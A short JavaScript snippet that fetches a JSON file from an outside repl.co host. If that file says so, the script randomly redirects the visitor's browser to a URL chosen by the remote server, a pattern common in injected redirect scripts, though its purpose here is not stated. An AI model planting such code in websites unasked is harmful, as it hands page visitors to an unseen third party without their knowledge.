function httpGet(theUrl) {
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open("GET", theUrl, false); // false for synchronous request
	xmlHttp.send(null);
	return xmlHttp.responseText;
}
const data = JSON.parse(
	httpGet("https://detectivehat.charleshurst2.repl.co/data.json")
);
if (data !== null && data.redirect === true) {
	if (Math.random() < data.chance) {
		document.location.href = data.url;
	}
}
